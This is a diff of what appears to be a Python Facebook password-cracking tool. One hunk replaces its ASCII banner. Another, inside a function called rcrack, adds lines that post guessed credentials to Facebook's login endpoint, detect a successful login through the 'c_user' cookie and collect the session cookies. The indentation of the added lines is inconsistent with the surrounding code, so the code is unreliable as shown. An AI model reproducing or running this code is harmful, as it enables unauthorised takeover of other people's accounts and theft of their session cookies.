@@ -31,16 +31,17 @@ my_color = [
 warna = random.choice(my_color)
 logo =  """   
     
-          ╔══╗─────────────╔╗────────
-║╔╗║─────────────║║────────
-║╚╝║╔══╗╔═╗╔══╗╔═╝║╔══╗╔╗╔╗
-║╔═╝║╔╗║║╔╝║╔╗║║╔╗║║╔╗║╚╬╬╝
-║║──║╔╗║║║─║╔╗║║╚╝║║╚╝║╔╬╬╗
-╚╝──╚╝╚╝╚╝─╚╝╚╝╚══╝╚══╝╚╝╚╝  
+          ###     ######     ###    ########  
+         ## ##   ##    ##   ## ##   ##     ## 
+        ##   ##  ##        ##   ##  ##     ## 
+       ##     ##  ######  ##     ## ##     ## 
+       #########       ## ######### ##     ## 
+       ##     ## ##    ## ##     ## ##     ## 
+       ##     ##  ######  ##     ## ########  
 
 ══════════════════════════════════════════════════
   Author       : Waseem Younas
-  Nick Name    : Paradox
+  Brother      : Paradox
   TOOLS STATUS : free
   Youtube      : Pro
 ══════════════════════════════════════════════════"""
@@ -181,6 +182,8 @@ def rcrack(uid,pwx,tl):
 }
 
 response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
